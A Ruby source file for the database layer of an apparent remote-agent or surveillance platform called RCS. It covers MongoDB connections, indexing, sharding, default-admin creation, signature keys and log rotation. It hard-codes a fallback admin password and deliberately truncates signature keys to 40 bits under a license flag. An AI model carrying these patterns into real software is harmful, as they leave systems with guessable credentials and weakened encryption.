#
# Layer for accessing the real DB
#

require_relative 'audit'
require_relative 'config'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'mongo'
require 'mongoid'
require 'moped'
require 'rbconfig'

# require all the DB objects
Dir[File.dirname(__FILE__) + '/db_objects/*.rb'].each do |file|
  require file
end

module RCS
module DB

class DB
  include Singleton
  include RCS::Tracer

  def initialize
    @available = false
    @auth_required = false
  end

  def connect
    begin
      # we are standalone (no rails or rack)
      ENV['MONGOID_ENV'] = 'yes'

      # set the parameters for the mongoid.yaml
      ENV['MONGOID_DATABASE'] = 'rcs'
      ENV['MONGOID_HOST'] = "#{Config.instance.global['CN']}"
      ENV['MONGOID_PORT'] = "27017"

      #Mongoid.logger = ::Logger.new($stdout)
      #Moped.logger = ::Logger.new($stdout)

      #Mongoid.logger.level = ::Logger::DEBUG
      #Moped.logger.level = ::Logger::DEBUG

      Mongoid.load!(Config.instance.file('mongoid.yaml'), :production)

      trace :info, "Connected to MongoDB at #{ENV['MONGOID_HOST']}:#{ENV['MONGOID_PORT']} version #{mongo_version}"

    rescue Exception => e
      trace :fatal, e
      return false
    end
    return true
  end

  # pooled connection
  def mongo_connection(db = ENV['MONGOID_DATABASE'], host = ENV['MONGOID_HOST'], port = ENV['MONGOID_PORT'].to_i)
    time = Time.now
    # instantiate a pool of connections that are thread-safe
    # this handle will be returned to every thread requesting for a new connection
    # also the pool is lazy (connect only on request)
    @mongo_db ||= Mongo::MongoClient.new(host, port, pool_size: 25, pool_timeout: 30, connect: false)
    delta = Time.now - time
    trace :warn, "Opening mongo pool connection is too slow (%f)" % delta if delta > 0.5 and Config.instance.global['PERF']
    return @mongo_db.db(db)
  end

  # single connection
  def new_mongo_connection(host = ENV['MONGOID_HOST'], port = ENV['MONGOID_PORT'].to_i)
    time = Time.now
    conn = Mongo::MongoClient.new(host, port)
    delta = Time.now - time
    trace :warn, "Opening new mongo connection is too slow (%f)" % delta if delta > 0.5 and Config.instance.global['PERF']
    return conn
  end

  def new_moped_connection(db = ENV['MONGOID_DATABASE'], host = ENV['MONGOID_HOST'], port = ENV['MONGOID_PORT'].to_i)
    time = Time.now
    # moped is not thread-safe.
    # we need to instantiate a new connection for every thread that is using it
    session = Moped::Session.new(["#{host}:#{port}"], {safe: true})
    session.use db
    delta = Time.now - time
    trace :warn, "Opening new moped connection is too slow (%f)" % delta if delta > 0.5 and Config.instance.global['PERF']
    return session
  end

  def mongo_version
    Mongoid.default_session.command(:buildinfo => 1)['version']
  rescue
    "unknown"
  end

  def config_collections
    @config_collections ||= begin
      mongo_connection unless @mongo_db
      @mongo_db.db('config').collections.find { |c| c.name == 'collections' }
    end
  end

  def index_diff(mongoid_document_class)
    collection = mongo_connection.collection(mongoid_document_class.collection.name)

    # Return true if the collection does not exists
    return true unless collection

    # Gets an array of hashes containing the index keys. Something
    # like [{"type"=>1}, {"type"=>1, "da"=>1, "aid"=>1}, {"da"=>1}].
    model_indexes_keys = mongoid_document_class.index_options.keys.map(&:stringify_keys)
    actual_indexes_keys = collection.index_information.map { |p| p.last['key'] }

    # Exclude the automatic index on the "_id" attribute
    actual_indexes_keys.reject! { |hash| hash == {'_id' => 1} }

    # Exclude the automatic index on the shard key
    namespace = "rcs.#{collection.name}"
    if mongoid_document_class.shard_key_fields
      key = mongoid_document_class.shard_key_fields.inject({}) { |h, v| h[v.to_s] = 1; h } # somehing like {"type"=>1, "da"=>1, "aid"=>1}
      actual_indexes_keys.reject! { |hash| hash == key }
    else
      config_coll = config_collections.find({'_id' => namespace}).first
      actual_indexes_keys.reject! { |hash| hash == config_coll['key'] } if config_coll
    end

    diff = {}
    diff[:added] = model_indexes_keys - actual_indexes_keys
    diff[:removed] = actual_indexes_keys - model_indexes_keys


    diff = nil if diff[:added].empty? and diff[:removed].empty?
    trace :debug, "Index diff of #{namespace}: #{diff ? diff.inspect : 'none'}"
    diff
  end

  # insert here the class to be indexed
  @@classes_to_be_indexed = [::Audit, ::User, ::Group, ::Alert, ::Status, ::Core, ::Collector, ::Injector, ::Item, ::PublicDocument, ::EvidenceFilter, ::Entity]

  def create_indexes
    db = DB.instance.mongo_connection

    trace :info, "Database size is: " + db.stats['dataSize'].to_s_bytes
    trace :info, "Ensuring indexing on collections..."

    @@classes_to_be_indexed.each do |klass|
      diff = index_diff(klass)
      next unless diff

      # create the index
      trace :info, "Creating indexes for #{klass.collection_name}"
      klass.remove_indexes if diff[:removed].any?
      klass.create_indexes
    end

    # index on shard id for the worker
    coll = db.collection('grid.evidence.files')
    coll.create_index('metadata.shard')
  end

  def enable_sharding
    if Shard.count == 0
      output = Shard.create(ENV['MONGOID_HOST'])
      trace :info, "Adding the first Shard: #{output}"
      raise "Cannot create shard" unless output['ok'] == 1
    end
    output = Shard.enable(ENV['MONGOID_DATABASE'])
    trace :info, "Enable Sharding on 'rcs': #{output}"
  end

  def shard_audit
    ::Audit.shard_collection
  end

  def ensure_admin
    # check that at least one admin is present and enabled
    # if it does not exists, create it
    if User.where(enabled: true, privs: 'ADMIN').count == 0
      trace :warn, "No ADMIN found, creating a default admin user..."
      User.where(name: 'admin').delete_all
      user = User.create(name: 'admin') do |u|
        if File.exist? Config.instance.file('admin_pass')
          pass = File.read(Config.instance.file('admin_pass'))
          FileUtils.rm_rf Config.instance.file('admin_pass')
        else
          pass = 'adminp123'
        end
        u[:pass] = u.create_password(pass)
        u[:enabled] = true
        u[:desc] = 'Default admin user'
        u[:privs] = ::User::PRIVS
        u[:locale] = 'en_US'
        u[:timezone] = 0
      end
      Audit.log :actor => '<system>', :action => 'user.create', :user_name => 'admin', :desc => "Created the default user 'admin'"

      group = Group.create(name: "administrators", alert: false)
      group.users << user
      group.save
      Audit.log :actor => '<system>', :action => 'group.create', :group_name => 'administrators', :desc => "Created the default group 'administrators'"
    end
  end

  def ensure_signatures
    if Signature.count == 0
      trace :warn, "No Signature found, creating them..."

      # NOTE about the key space:
      # the length of the key is 32 chars based on an alphabet of 16 combination (hex digits)
      # so the combinations are 16^32 that is 2^128 bits
      # if the license contains the flag to lower the encryption bits we have to
      # cap this to 2^40 so we can cut the key to 10 chars that is 16^10 == 2^40 bits

      Signature.create(scope: 'agent') do |s|
        s.value = SecureRandom.hex(16)
        s.value[10..-1] = "0" * (s.value.length - 10) if LicenseManager.instance.limits[:encbits]
      end
      Signature.create(scope: 'collector') do |s|
        s.value = SecureRandom.hex(16)
        s.value[10..-1] = "0" * (s.value.length - 10) if LicenseManager.instance.limits[:encbits]
      end
      Signature.create(scope: 'network') do |s|
        s.value = SecureRandom.hex(16)
        s.value[10..-1] = "0" * (s.value.length - 10) if LicenseManager.instance.limits[:encbits]
      end
      Signature.create(scope: 'server') do |s|
        s.value = SecureRandom.hex(16)
        s.value[10..-1] = "0" * (s.value.length - 10) if LicenseManager.instance.limits[:encbits]
      end
    end
    # dump the signature for NIA, Anon etc to a file
    File.open(Config.instance.cert('rcs-network.sig'), 'wb') {|f| f.write Signature.where(scope: 'network').first.value}
  end

  def ensure_cn_resolution
    # only for windows
    return unless RbConfig::CONFIG['host_os'] =~ /mingw/

    # don't add if it's an ip address
    return unless Config.instance.global['CN'] =~ /[a-zA-Z]/

    # make sure the CN is resolved properly in IPv4
    content = File.open("C:\\windows\\system32\\drivers\\etc\\hosts", 'rb') {|f| f.read}

    entry = "\r\n127.0.0.1\t#{Config.instance.global['CN']}\r\n"

    # check if already present
    unless content[entry]
      trace :info, "Adding CN (#{Config.instance.global['CN']}) to /etc/hosts file"
      content += entry
      File.open("C:\\windows\\system32\\drivers\\etc\\hosts", 'wb') {|f| f.write content}
    end
  rescue Exception => e
    trace :error, "Cannot modify the host file: #{e.message}"
  end

  def logrotate
    # perform the log rotation only at midnight
    time = Time.now
    return unless time.hour == 0 and time.min == 0

    trace :info, "Log Rotation"

    conn = new_mongo_connection(Config.instance.global['CN'], 27017)
    conn.db('admin').command({ logRotate: 1 })
    conn.close

    conn = new_mongo_connection(Config.instance.global['CN'], 27018)
    conn.db('admin').command({ logRotate: 1 })
    conn.close

    conn = new_mongo_connection(Config.instance.global['CN'], 27019)
    conn.db('admin').command({ logRotate: 1 })
    conn.close
  end

  def create_evidence_filters
    trace :debug, "Creating default evidence filters"
    ::EvidenceFilter.create_default
  end

  def mark_bad_items
    return unless File.exist?(Config.instance.file('mark_bad'))

    value = File.read(Config.instance.file('mark_bad'))
    value = value.chomp == 'true' ? true : false

    trace :info, "Marking all old items as bad (#{value})..."

    # we cannot use update_all since is atomic and does not call the callback
    # for the checksum recalculation
    ::Item.agents.each do |agent|
      agent.good = value
      agent.upgradable = false
      agent.save
    end
    ::Item.factories.each do |factory|
      factory.good = value
      factory.save
    end

    ::Collector.update_all(good: value)

    FileUtils.rm_rf Config.instance.file('mark_bad')
  end

end

end #DB::
end #RCS::
